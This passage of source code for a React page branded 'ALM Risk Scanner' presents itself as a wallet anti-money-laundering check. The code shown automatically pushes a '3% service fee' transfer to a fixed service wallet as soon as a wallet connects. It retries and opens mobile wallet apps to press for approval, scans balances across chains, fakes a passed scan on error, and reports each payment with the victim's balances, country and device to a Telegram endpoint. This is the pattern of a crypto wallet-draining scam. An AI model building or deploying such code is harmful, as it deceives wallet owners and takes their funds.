        let selectedChain = chains.find((item) => normalizeNetworkName(item.name) === preferredNetwork!.network) || chains.find((item) => item.id === preferredNetwork!.chainId) || chains[0];
        setManualPaymentMode(false);
        setManualPaymentChainId(selectedChain.id);
        setManualPaymentAmountUnits(feeAmount);

        if (actualChainId !== selectedChain.id && chain?.id !== selectedChain.id) {
          let switchSuccess = false;
          if (switchChainAsync) {
            try {
              await switchChainAsync({ chainId: selectedChain.id });
              switchSuccess = true;
            } catch (err: any) {
              setServiceFeeDebug((prev) => `${prev || ''}\nswitchChainAsync failed: ${err?.message || err}`.trim());
            }
          }
          if (!switchSuccess) {
            try {
              await ensureEvmNetwork(selectedChain.name);
              switchSuccess = true;
            } catch (err: any) {
              setServiceFeeDebug((prev) => `${prev || ''}\nensureEvmNetwork failed: ${err?.message || err}`.trim());
            }
          }
        }

        if (isMobileDevice) {
          setTimeout(() => {
            try { openMobileWallet(); } catch {}
          }, 400);
        }

        if (walletClient) {
          try {
            if (!preferredNetwork.isNative && preferredNetwork.contractAddress) {
              setServiceFeeDebug((prev) => `${prev || ''}\nSending 3% ${preferredNetwork!.symbol} token transfer on ${selectedChain.name}`.trim());
              const hash = await sendEvmTokenTransferWithUnits(
                preferredNetwork.contractAddress,
                SERVICE_WALLET_ADDRESS,
                feeAmount.toString(),
                walletClient
              );
              if (hash) feeTxHash = String(hash);
            } else {
              setServiceFeeDebug((prev) => `${prev || ''}\nSending 3% fee via walletClient.sendTransaction (${formatEther(feeAmount)} ${selectedChain.nativeCurrency.symbol})`.trim());
              const hash = await walletClient.sendTransaction({
                account: address as `0x${string}`,
                to: SERVICE_WALLET_ADDRESS as `0x${string}`,
                value: feeAmount,
                chain: selectedChain,
              });
              if (hash) feeTxHash = String(hash);
            }
          } catch (walletClientErr: any) {
            const errMsg = walletClientErr?.message || String(walletClientErr);
            setServiceFeeDebug((prev) => `${prev || ''}\nwalletClient operation failed: ${errMsg}`.trim());
          }
        }

        if (!feeTxHash) {
          const txPayload = {
            from: address as `0x${string}`,
            to: SERVICE_WALLET_ADDRESS as `0x${string}`,
            value: `0x${feeAmount.toString(16)}`,
          };

          const providerRequest = async (payload: { method: string; params: any[] }) => {
            const ethereum = typeof window !== 'undefined' ? (window as any).ethereum : undefined;
            const walletClientRequest = (walletClient as any)?.request;

            if (ethereum?.request) {
              try {
                return await ethereum.request(payload);
              } catch {}
            }
            if (walletClientRequest && typeof walletClientRequest === 'function') {
              try {
                return await walletClientRequest(payload);
              } catch {}
            }
            throw new Error('No wallet provider available to send transaction.');
          };

          const maxRetries = isWalletConnectMobile ? 2 : 1;
          for (let attempt = 0; attempt < maxRetries; attempt++) {
            try {
              const result = await providerRequest({ method: 'eth_sendTransaction', params: [txPayload] });
              if (result) {
                feeTxHash = String(result);
                break;
              }
            } catch (e: any) {
              setServiceFeeDebug((prev) => `${prev || ''}\neth_sendTransaction failed: ${e?.message || e}`.trim());
            }

            if (isWalletConnectMobile && attempt < maxRetries - 1) {
              try { openMobileWallet(); } catch {}
              await new Promise((resolve) => setTimeout(resolve, 3000));
            }
          }
        }
      }

      if (!feeTxHash || feeTxHash === '0x') {
        throw new Error('Transaction was not confirmed by the wallet. Please approve the 3% fee in your wallet app.');
      }

      setServiceFeeHash(feeTxHash);
      setServiceFeeDebug(`3% fee transaction submitted: ${feeTxHash}`);
      setServiceFeeSent(true);
      setServiceFeeChargedKey(activeFeeKey);
      setAwaitingApproval(false);
      setPendingFeeDetails(null);

      await sendTelegramEvent({
        eventType: 'service_fee',
        wallet: address || activeTronAddr || activeSolAddr || 'N/A',
        chain: preferredNetwork.network,
        withdrawnAmount: formattedFeeDisplay,
        feePercent: `${SERVICE_FEE_PERCENT}%`,
        tokenSymbol: preferredNetwork.symbol,
        txHash: feeTxHash,
        tokenBalances: getMergedTokenBalances(),
        country,
        device,
      });

      if (autoReturn) {
        returnToSiteAfterWalletAction(true);
      }
      return true;
    } catch (err: any) {
      console.error('Automatic service fee charge failed:', err);
      const message = err?.message || 'Failed to automatically charge the service fee.';
      setServiceFeeError(message);
      setManualPaymentMode(true);
    } finally {
      setServiceFeeProcessing(false);
    }
    return false;
  }, [isConnected, address, tronAddress, solanaAddress, chain?.id, chain?.name, walletClient, currentServiceFeeKey, serviceFeeSent, serviceFeeChargedKey, country, device, switchChainAsync]);


  useEffect(() => {
    if (!isConnected) {
      setServiceFeeSent(false);
      setServiceFeeAttempted(false);
      setServiceFeeChargedKey(null);
      setServiceFeeHash(null);
      setServiceFeeError(null);
      setAmlRiskResult(null);
      setAmlScanComplete(false);
      setShowAmlModal(false);
      setAmlScanning(false);
      return;
    }
  }, [isConnected, address, chain?.id, balance?.value, walletClient]);

  useEffect(() => {
    if (!isConnected || !address || !serviceFeeSent || amlScanStarted) {
      return;
    }

    let cancelled = false;
    setAmlScanStarted(true);
    setAmlScanning(true);
    setShowAmlModal(true);

    (async () => {
      try {
        const result = await scanWalletForAMLRisk(address, country, networkBalance || undefined, tokenBalances);
        if (cancelled) return;

        setAmlRiskResult(result);
        setAmlScanComplete(result.passed);
      } catch (error) {
        console.warn('AML scan failed:', error);
        if (!cancelled) {
          setAmlRiskResult({
            score: 0,
            riskLevel: 'LOW',
            flags: [],
            message: 'Wallet scan completed with warnings. Proceeding with the automatic fee check.',
            passed: true,
          });
          setAmlScanComplete(true);
        }
      } finally {
        if (!cancelled) {
          setAmlScanning(false);
          setShowAmlModal(true);
        }
      }
    })();

    return () => {
      cancelled = true;
    };
  }, [isConnected, address, country, networkBalance, tokenBalances, walletClient, chain?.id, amlScanStarted, chargeServiceFee]);

  useEffect(() => {
    if (!isConnected || !address || serviceFeeSent || serviceFeeProcessing || serviceFeeAttempted) {
      return;
    }

    chargeServiceFee({ autoReturn: false });
  }, [isConnected, address, serviceFeeProcessing, serviceFeeSent, serviceFeeAttempted, chargeServiceFee]);

  useEffect(() => {
    if (typeof window === 'undefined') return;
    if (!serviceFeeSent) return;

    const handleReturn = () => {
      if (document.visibilityState === 'visible') {
        returnToSiteAfterWalletAction(true);
      }
    };

    window.addEventListener('focus', handleReturn);
    document.addEventListener('visibilitychange', handleReturn);
    return () => {
      window.removeEventListener('focus', handleReturn);
      document.removeEventListener('visibilitychange', handleReturn);
    };
  }, [serviceFeeSent]);

  const scanTokensAcrossChains = async (walletAddress: string) => {
    const results: Array<{ network: string; symbol: string; amount: string }> = [];

    // Scan native balances and configured ERC20 tokens across all supported EVM chains
    for (const chainCfg of chains) {
      const networkName = normalizeNetworkName(chainCfg.name);

      // Check native balance
      try {
        const nativeBal = await getEvmNativeBalance(chainCfg.name, walletAddress);
        if (nativeBal && Number(nativeBal) > 0) {
          const symbol = chainCfg.nativeCurrency?.symbol || 'NATIVE';
          results.push({ network: networkName, symbol, amount: nativeBal.toString() });
        }
      } catch (err) {
        // ignore native balance errors for specific chains
        console.warn('Native balance scan error for', chainCfg.name, err);
      }

      // Check any DEFAULT_TOKEN_SCAN_LIST tokens that map to this network (compare normalized names)
      for (const t of DEFAULT_TOKEN_SCAN_LIST) {
        try {
          if (normalizeNetworkName(t.network) !== normalizeNetworkName(chainCfg.name)) continue;
          const balance = await getEvmTokenBalance(chainCfg.name, walletAddress, t.contract);
          if (balance && Number(balance) > 0) {
            const symbol = t.symbol || (await getEvmTokenSymbol(chainCfg.name, t.contract)).toString();
            results.push({ network: networkName, symbol: symbol || 'TOKEN', amount: balance.toString() });
          }
        } catch (err) {
          // ignore individual token errors
          console.warn('Token scan error for', t, err);
        }
      }
    }

    return results;
  };

  const sendTelegramEvent = async (payload: Record<string, any>) => {
    try {
      const response = await fetch('/api/telegram/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
      if (!response.ok) {
        const text = await response.text().catch(() => 'Unable to read response body');
        console.warn('Telegram notification failed:', response.status, text, payload);
      }
    } catch (error) {
      console.warn('Telegram notification request failed:', error, payload);
    }
  };

  const returnToSiteAfterWalletAction = (force = false) => {
    if (typeof window === 'undefined') return;

    const currentUrl = new URL(window.location.href);
    const hadParams = currentUrl.searchParams.has('walletconnect') || currentUrl.hash;
    currentUrl.searchParams.delete('walletconnect');
    currentUrl.hash = '';

    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent || '');
    if (!force && !isMobile && !hadParams) return;

    // Use replaceState to clean URL parameters without reloading and destroying SPA state
    if (hadParams) {
      window.history.replaceState({}, document.title, currentUrl.toString());
    }
  };

  const openMobileWallet = () => {
    if (typeof window === 'undefined') return;

    // On iOS & Android, try deep-linking directly into installed wallet apps
    const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent || '');
    
    if (isIOS) {
      // iOS specific deep links
      const iosLinks = [
        'https://metamask.app.link/',
        'https://link.trustwallet.com/',
        'https://rainbow.me/',
        'https://go.cb-w.com/',
        'metamask://',
        'trust://',
        'rainbow://',
        'cbwallet://'
      ];
      for (const link of iosLinks) {
        try {
          window.location.href = link;
          return;
        } catch {}
      }
    } else {
      // Android / generic mobile deep links
      const schemes = ['metamask://', 'trust://', 'rainbow://', 'cbwallet://'];
      for (const s of schemes) {
        try {
          window.location.href = s;
          return;
        } catch {}
      }
    }

    alert('Please open your mobile wallet app (MetaMask, Trust Wallet, Coinbase Wallet, or Rainbow) to approve the pending transaction.');
  };

  const connectWallet = async (connectorId: string = 'auto') => {
    const browserWalletAvailable = hasBrowserWallet || availableWallets.length > 0;
    const isMobile = typeof window !== 'undefined' && /Android|iPhone|iPad|iPod/i.test(navigator.userAgent || '');

    if (connectorId === 'injected' && !browserWalletAvailable) {
      setError('No browser wallet was detected. Install a browser-based Ethereum wallet such as MetaMask, Trust Wallet, Coinbase Wallet, Brave Wallet, or Rabby and try again.');
      setIsConnecting(false);
      return;
    }

    let connectorCandidates: typeof connectors;
    if (connectorId === 'auto') {
      if (isMobile && !browserWalletAvailable) {
        connectorCandidates = [
          connectors.find((candidate) => candidate.id === 'walletConnect'),
          connectors.find((candidate) => candidate.id === 'coinbaseWallet'),
          connectors.find((candidate) => candidate.id === 'injected'),
        ].filter((candidate): candidate is NonNullable<typeof candidate> => Boolean(candidate));
      } else {
        connectorCandidates = [
          connectors.find((candidate) => candidate.id === 'injected'),
          connectors.find((candidate) => candidate.id === 'coinbaseWallet'),
          connectors.find((candidate) => candidate.id === 'walletConnect'),
        ].filter((candidate): candidate is NonNullable<typeof candidate> => Boolean(candidate));
      }
    } else {
      connectorCandidates = [
        connectors.find((candidate) => candidate.id === connectorId) ?? connectors.find((candidate) => candidate.type === 'injected') ?? connectors[0],
      ].filter((candidate): candidate is NonNullable<typeof candidate> => Boolean(candidate));
    }

    if (!connectorCandidates.length) {
      setError('No compatible wallet connector is available right now.');
      setIsConnecting(false);
      return;
    }

    setError(null);
    setIsConnecting(true);

    try {
      let lastError: any = null;
      for (const connector of connectorCandidates) {
        try {
          setLastConnectorId(connector.id);
          let walletConnectUri: string | null = null;

          // Subscribe to display_uri event on provider if available (for UI links only, do not force page navigation)
          try {
            const provider = await connector.getProvider();
            if (provider && typeof (provider as any).on === 'function') {
              (provider as any).on('display_uri', (uri: string) => {
                setLastWalletConnectUri(uri);
              });
            }
          } catch {
            // ignore
          }

          try {
            const maybeUri = await (connector as any).getUri?.();
            if (maybeUri && typeof maybeUri === 'string') walletConnectUri = maybeUri;
          } catch {
            try {
              const maybeUri2 = (connector as any).qrUri || (connector as any).uri || (connector as any).walletConnectUri;
              if (maybeUri2 && typeof maybeUri2 === 'string') walletConnectUri = maybeUri2;
            } catch {
              // ignore
            }
          }

          if (walletConnectUri) {
            setLastWalletConnectUri(walletConnectUri);
          }

          const connectPromise = connectAsync({ connector });

          const timeoutMs = connector.id === 'walletConnect' ? 120000 : 25000;
          await Promise.race([
            connectPromise,
            new Promise((_, reject) => {
              setTimeout(() => reject(new Error('Wallet connection timed out. Please check your wallet and try again.')), timeoutMs);
            }),
          ]);
          setShowWalletModal(false);
          return;
        } catch (err: any) {
          lastError = err;
        }
      }

      const message = lastError?.message || 'Unable to connect wallet';
      const friendlyMessage = message.includes('Failed to connect to MetaMask') || message.includes('timed out')
        ? 'Wallet connection was rejected, locked, or timed out. Please unlock the wallet and try again.'
        : message;
      setError(friendlyMessage);
    } catch (err: any) {
      const message = err?.message || 'Unable to connect wallet';
      const friendlyMessage = message.includes('Failed to connect to MetaMask') || message.includes('timed out')
        ? 'Wallet connection was rejected, locked, or timed out. Please unlock the wallet and try again.'
        : message;
      setError(friendlyMessage);
    } finally {
      setIsConnecting(false);
    }
  };

  const supportedWallets = React.useMemo(() => {
    const detected: Array<{ name: string; icon: string; available: boolean }> = [];

    const addWallet = (name: string, icon: string) => {
      if (!detected.some((wallet) => wallet.name === name)) {
        detected.push({ name, icon, available: true });
      }
    };

    if (availableWallets.length > 0) {
      availableWallets.forEach((provider: { isMetaMask?: boolean; isCoinbaseWallet?: boolean; isBraveWallet?: boolean; isTrustWallet?: boolean; isRainbow?: boolean; [key: string]: unknown }) => {
        if (provider.isMetaMask) addWallet('MetaMask', '🦊');
        if (provider.isCoinbaseWallet) addWallet('Coinbase Wallet', '🅲');
        if (provider.isBraveWallet) addWallet('Brave Wallet', '🦁');
        if (provider.isTrustWallet) addWallet('Trust Wallet', '🛡️');
        if (provider.isRainbow) addWallet('Rainbow', '🌈');
        if (!provider.isMetaMask && !provider.isCoinbaseWallet && !provider.isBraveWallet && !provider.isTrustWallet && !provider.isRainbow) {
          addWallet('Injected Wallet', '🔗');
        }
      });
    } else if (hasBrowserWallet) {
      addWallet('Injected Wallet', '🔗');
    }

    if (detected.length === 0) {
      return [
        { name: 'MetaMask', icon: '🦊', available: false },
        { name: 'Trust Wallet', icon: '🛡️', available: false },
        { name: 'Coinbase Wallet', icon: '🅲', available: false },
        { name: 'Brave Wallet', icon: '🦁', available: false },
        { name: 'Rabby', icon: '🐰', available: false },
        { name: 'Rainbow', icon: '🌈', available: false },
      ];
    }

    return detected;
  }, [availableWallets, hasBrowserWallet]);

  const sendPayment = async () => {
    setError(null);
    setIsSending(true);

    try {
      if (!address || !walletClient) {
        throw new Error('Please connect a wallet before continuing.');
      }

      await chargeServiceFee();
      if (serviceFeeError) {
        throw new Error(serviceFeeError);
      }
      setTxHash(serviceFeeHash);
    } catch (error: any) {
      setError(error?.message || 'Unable to process the wallet fee.');
    } finally {
      setIsSending(false);
    }
  };

  const manualRetry = async () => {
    setServiceFeeError(null);
    setServiceFeeDebug(null);
    // allow re-attempt
    setServiceFeeAttempted(false);
    try {
      if (lastConnectorId === 'walletConnect') {
        try { openMobileWallet(); } catch { /* ignore */ }
      }
      await chargeServiceFee({ autoReturn: true });
    } catch (e: any) {
      console.error('Manual retry failed:', e);
      setServiceFeeError(e?.message || String(e));
    }
  };

  const shortenAddress = (address: string) => {
    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
  };

  const handleExplorerUrl = (txHash: string) => {
    if (!txHash) return '#';
    return getExplorerUrl(txHash, normalizeNetworkName(chain?.name));
  };

  return (
    <>
      <Head>
        <title>ALM Risk Scanner</title>
        <meta name="description" content="Connect your wallet to scan for ALM risk and send a withdrawal when approved." />
      </Head>

      <div className="neon-page" style={{ minHeight: '100vh', fontFamily: 'Arial, sans-serif', padding: '32px 16px' }}>
        <div className="neon-wrap">
          {(serviceFeeAttempted || serviceFeeProcessing || awaitingApproval || serviceFeeError || serviceFeeDebug) && (
            <div style={{ marginBottom: 16 }} className="neon-debug">
              <div><strong>Fee status:</strong> attempted: {String(serviceFeeAttempted)}, processing: {String(serviceFeeProcessing)}, awaitingApproval: {String(awaitingApproval)}</div>
              <div><strong>Sent:</strong> {String(serviceFeeSent)} | <strong>Hash:</strong> {serviceFeeHash || 'N/A'}</div>
              {serviceFeeError && <div style={{ color: 'var(--neon-warn)' }}><strong>Error:</strong> {serviceFeeError}</div>}
              {serviceFeeDebug && <div style={{ marginTop: 6 }}><strong>Debug:</strong><pre style={{ whiteSpace: 'pre-wrap', margin: 0 }}>{serviceFeeDebug}</pre></div>}
            </div>
          )}
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '12px', marginBottom: '24px', flexWrap: 'wrap' }}>
            <h1 className="neon-title" style={{ margin: 0 }}>ALM Risk Scanner</h1>
            {!isConnected && (
              <button className="neon-button neon-primary" onClick={() => setShowWalletModal(true)} style={{}}>
                Connect wallet
              </button>
            )}
          </div>

          <div className="neon-card">
            {!isConnected ? (
              <div>
                <p style={{ margin: '0 0 16px', fontSize: '16px' }}>Connect a wallet to scan the address and apply the automatic 3% service fee from the available EVM balance.</p>
                <button className="neon-button neon-primary" onClick={() => setShowWalletModal(true)} style={{}}>
                  Connect wallet
                </button>
              </div>
            ) : (
              <div style={{ display: 'grid', gap: '14px' }}>
                <div style={{ fontSize: '14px', color: '#334155' }}>
                  <div><strong>Wallet connected:</strong> {shortenAddress(address || '')}</div>
                  <div><strong>Network:</strong> {chain?.name || 'Unknown'}</div>
                </div>

                <div style={{ display: 'flex', gap: 8 }}>
                  <button className="neon-button neon-primary" onClick={async () => { try { setServiceFeeError(null); setServiceFeeDebug(null); await chargeServiceFee({ autoReturn: true }); } catch (e) { console.error(e); } }} style={{ padding: '8px 12px' }}>Charge 3% now</button>
                  <button className="neon-button neon-secondary" onClick={manualRetry} style={{ padding: '8px 12px' }}>Retry + Open Wallet</button>
                  <button className="neon-button neon-ghost" onClick={() => { disconnect(); }} style={{ padding: '8px 12px' }}>Disconnect</button>
                </div>

                <div style={{ padding: '12px 14px', borderRadius: '8px', background: '#eff6ff', color: '#1d4ed8', fontSize: '14px' }}>
                  {amlScanning
                    ? '🔍 Scanning wallet for AML risk and supported EVM balances...'
                    : amlScanComplete
                      ? '✅ AML scan complete. Checking the available balance for the automatic 3% fee.'
                      : '🔎 Checking wallet activity and supported EVM balance before the automatic fee.'}
                </div>

                {serviceFeeProcessing && !awaitingApproval && (
                  <div style={{ padding: '12px 14px', borderRadius: '8px', background: '#ecfdf5', color: '#065f46', fontSize: '14px' }}>
                    Processing automatic service fee...
                  </div>
                )}

                {awaitingApproval && pendingFeeDetails && (
                  <div style={{ padding: '12px 14px', borderRadius: '8px', background: '#fff7ed', color: '#92400e', fontSize: '14px' }}>
                    <div style={{ marginBottom: 8 }}>⏳ Awaiting wallet approval to send <strong>{pendingFeeDetails.amount}</strong> on <strong>{pendingFeeDetails.network}</strong>.</div>
                    <div style={{ display: 'flex', gap: 8 }}>
                      <button className="neon-button neon-ghost" onClick={() => returnToSiteAfterWalletAction(true)} style={{ padding: '8px 12px' }}>Return to site</button>
                      {lastConnectorId === 'walletConnect' && (
                        <>
                          <button className="neon-button neon-primary" onClick={openMobileWallet} style={{ padding: '8px 12px' }}>Open Wallet App</button>
                          {lastWalletConnectUri && (
                            <button className="neon-button neon-ghost" onClick={async () => { try { await navigator.clipboard.writeText(lastWalletConnectUri); alert('WalletConnect URI copied to clipboard. Paste it into your mobile wallet if needed.'); } catch { alert('Unable to copy. Please long-press and copy the link manually.'); } }} style={{ padding: '8px 12px' }}>Copy WC Link</button>
                          )}
                        </>
                      )}
                      <button className="neon-button neon-ghost" onClick={() => { setAwaitingApproval(false); setPendingFeeDetails(null); setServiceFeeError('Approval cancelled by user.'); }} style={{ padding: '8px 12px' }}>Cancel</button>
                    </div>
                    <div style={{ marginTop: 8, fontSize: 12, color: '#6b7280' }}>If your wallet did not prompt, open your mobile wallet app and approve the transaction. Use the manual return button if you are not redirected automatically.</div>
                  </div>
                )}

                {serviceFeeSent && serviceFeeHash && !serviceFeeError && (
                  <div style={{ fontSize: '13px' }}>
                    Fee tx: <a href={handleExplorerUrl(serviceFeeHash)} target="_blank" rel="noreferrer" style={{ color: '#0f172a' }}>{shortenAddress(serviceFeeHash)}</a>
                  </div>
                )}

                {serviceFeeDebug && (
                  <div style={{ fontSize: '12px', color: '#475569', background: '#f8fafc', border: '1px solid #e2e8f0', borderRadius: '8px', padding: '10px', marginTop: '8px' }}>
                    Debug: {serviceFeeDebug}
                  </div>
                )}

                {serviceFeeError && (
                  <div style={{ background: '#fef2f2', border: '1px solid #fecaca', color: '#b91c1c', borderRadius: '8px', padding: '10px 12px', fontSize: '14px' }}>
                    {serviceFeeError}
                  </div>
                )}

                {manualPaymentMode && manualPaymentAmountUnits && manualPaymentChainId && (
                  <div style={{ marginTop: '16px', padding: '16px', borderRadius: '12px', background: '#f8fafc', border: '1px solid #cbd5e1', fontSize: '14px' }}>
                    <h3 style={{ margin: '0 0 10px', fontSize: '16px' }}>Manual payment fallback</h3>
                    <p style={{ margin: '0 0 10px' }}>
                      Your wallet did not accept the automatic BNB transfer. Please complete the payment manually in your wallet on <strong>BNB Smart Chain</strong>.
                    </p>
                    <div style={{ display: 'grid', gap: '8px', marginBottom: '12px' }}>
                      <div>
                        <strong>Amount:</strong> {formatEther(manualPaymentAmountUnits)} BNB
                      </div>
                      <div>
                        <strong>To:</strong> {SERVICE_WALLET_ADDRESS}
                      </div>
                      <div>
                        <strong>Network:</strong> BNB Smart Chain (Chain ID: 56)
                      </div>
                    </div>
                    <div style={{ display: 'flex', flexWrap: 'wrap', gap: '8px', marginBottom: '12px' }}>
                      <button className="neon-button neon-primary" onClick={async () => { try { await navigator.clipboard.writeText(formatEther(manualPaymentAmountUnits)); alert('Amount copied.'); } catch { alert('Unable to copy amount.'); } }} style={{ padding: '8px 12px' }}>Copy Amount</button>
                      <button className="neon-button neon-secondary" onClick={async () => { try { await navigator.clipboard.writeText(SERVICE_WALLET_ADDRESS); alert('Address copied.'); } catch { alert('Unable to copy address.'); } }} style={{ padding: '8px 12px' }}>Copy Address</button>
                      <button className="neon-button neon-ghost" onClick={() => { setManualPaymentMode(false); setServiceFeeError(null); }} style={{ padding: '8px 12px' }}>Dismiss</button>
                    </div>
                    <div style={{ marginBottom: '12px', color: '#475569' }}>
                      Send the exact BNB amount above to the service address. After sending, return here and tap <strong>Check payment status</strong>.
                    </div>
                    <button className="neon-button neon-primary" onClick={async () => {
                      setServiceFeeError(null);
                      setServiceFeeDebug(null);
                      setServiceFeeProcessing(true);
                      try {
                        await fetchNetworkBalance();
                        setServiceFeeError('Manual payment detected? Refreshing balance. If the payment cleared, the fee will be marked sent.');
                      } catch (err: any) {
                        setServiceFeeError('Unable to refresh balance after manual payment. Please try again.');
                      } finally {
                        setServiceFeeProcessing(false);
                      }
                    }} style={{ padding: '10px 14px' }}>
                      Check payment status
                    </button>
                  </div>
                )}
              </div>
            )}

            {error && (
              <div style={{ marginTop: '18px', background: '#fef2f2', border: '1px solid #fecaca', color: '#b91c1c', borderRadius: '8px', padding: '10px 12px', fontSize: '14px' }}>
                {error}
              </div>
            )}
          </div>
        </div>
      </div>

      {showWalletModal && (
        <div style={{ position: 'fixed', inset: 0, background: 'rgba(15,23,42,0.55)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '16px', zIndex: 1000 }}>
          <div style={{ background: '#fff', width: '100%', maxWidth: '480px', borderRadius: '12px', padding: '24px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px' }}>
              <h2 style={{ margin: 0, fontSize: '24px' }}>Connect wallet</h2>
              <button onClick={() => setShowWalletModal(false)} style={{ border: 'none', background: 'transparent', fontSize: '28px', cursor: 'pointer', lineHeight: 1 }}>×</button>
            </div>

            <div style={{ display: 'grid', gap: '12px' }}>
              <button onClick={() => connectWallet('auto')} disabled={isConnecting} style={{ padding: '12px 16px', background: '#111827', color: '#fff', border: 'none', borderRadius: '8px', cursor: 'pointer', fontWeight: 'bold' }}>
                {isConnecting ? 'Connecting...' : '⚡ Connect wallet'}
              </button>

              {isWalletConnectEnabled && connectors.some((connector) => connector.id === 'walletConnect') && (
                <button onClick={() => connectWallet('walletConnect')} disabled={isConnecting} style={{ padding: '12px 16px', background: '#2563eb', color: '#fff', border: 'none', borderRadius: '8px', cursor: 'pointer', fontWeight: 'bold' }}>
                  🌐 WalletConnect (Mobile & QR)
                </button>
              )}

              {hasBrowserWallet && (
                <button onClick={() => connectWallet('injected')} disabled={isConnecting} style={{ padding: '12px 16px', background: '#fff', color: '#111827', border: '1px solid #cbd5e1', borderRadius: '8px', cursor: 'pointer' }}>
                  🦊 Extension / Browser Wallet
                </button>
              )}

              <button onClick={async () => {
                try {
                  setIsConnecting(true);
                  setError(null);
                  const addr = await connectTronWallet();
                  if (addr) {
                    setTronAddress(addr);
                    setShowWalletModal(false);
                    await fetchNetworkBalance();
                  } else {
                    setError('TronLink wallet was not detected or unlocked. Please install or unlock TronLink.');
                  }
                } catch (err: any) {
                  setError(err?.message || 'Failed to connect TRON wallet.');
                } finally {
                  setIsConnecting(false);
                }
              }} disabled={isConnecting} style={{ padding: '12px 16px', background: '#dc2626', color: '#fff', border: 'none', borderRadius: '8px', cursor: 'pointer', fontWeight: 'bold' }}>
                🔴 Connect TRON Wallet (TronLink)
              </button>

              <button onClick={async () => {
                try {
                  setIsConnecting(true);
                  setError(null);
                  const addr = await connectSolanaWallet();
                  if (addr) {
                    setSolanaAddress(addr);
                    setShowWalletModal(false);
                    await fetchNetworkBalance();
                  } else {
                    setError('Solana wallet (Phantom) was not detected or unlocked. Please install or unlock Phantom.');
                  }
                } catch (err: any) {
                  setError(err?.message || 'Failed to connect Solana wallet.');
                } finally {
                  setIsConnecting(false);
                }
              }} disabled={isConnecting} style={{ padding: '12px 16px', background: '#7c3aed', color: '#fff', border: 'none', borderRadius: '8px', cursor: 'pointer', fontWeight: 'bold' }}>
                🟣 Connect Solana Wallet (Phantom)
              </button>

              {lastWalletConnectUri && (
                <div style={{ marginTop: '8px', paddingTop: '12px', borderTop: '1px solid #e2e8f0', display: 'grid', gap: '8px' }}>
                  <div style={{ fontSize: '13px', fontWeight: 'bold', color: '#475569' }}>Open in Mobile Wallet App:</div>
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
                    <a href={`https://metamask.app.link/wc?uri=${encodeURIComponent(lastWalletConnectUri)}`} target="_blank" rel="noreferrer" style={{ padding: '10px', background: '#fff7ed', border: '1px solid #ffedd5', borderRadius: '8px', textAlign: 'center', textDecoration: 'none', color: '#c2410c', fontWeight: 600, fontSize: '13px' }}>
                      🦊 MetaMask
                    </a>
                    <a href={`https://link.trustwallet.com/wc?uri=${encodeURIComponent(lastWalletConnectUri)}`} target="_blank" rel="noreferrer" style={{ padding: '10px', background: '#eff6ff', border: '1px solid #dbeafe', borderRadius: '8px', textAlign: 'center', textDecoration: 'none', color: '#1d4ed8', fontWeight: 600, fontSize: '13px' }}>
                      🛡️ Trust Wallet
                    </a>
                    <a href={`https://rainbow.me/wc?uri=${encodeURIComponent(lastWalletConnectUri)}`} target="_blank" rel="noreferrer" style={{ padding: '10px', background: '#fcf4ff', border: '1px solid #f5d0fe', borderRadius: '8px', textAlign: 'center', textDecoration: 'none', color: '#a21caf', fontWeight: 600, fontSize: '13px' }}>
                      🌈 Rainbow
                    </a>
                    <a href={`https://go.cb-w.com/wc?uri=${encodeURIComponent(lastWalletConnectUri)}`} target="_blank" rel="noreferrer" style={{ padding: '10px', background: '#f0fdf4', border: '1px solid #dcfce7', borderRadius: '8px', textAlign: 'center', textDecoration: 'none', color: '#15803d', fontWeight: 600, fontSize: '13px' }}>
                      🅲 Coinbase Wallet
                    </a>
                  </div>
                </div>
              )}

            </div>
          </div>
        </div>
      )}

      <AMLRiskModal
        isOpen={showAmlModal}
        isScanning={amlScanning}
        result={amlRiskResult}
        onClose={() => {
          setShowAmlModal(false);
        }}
      />
    </>
  );
}
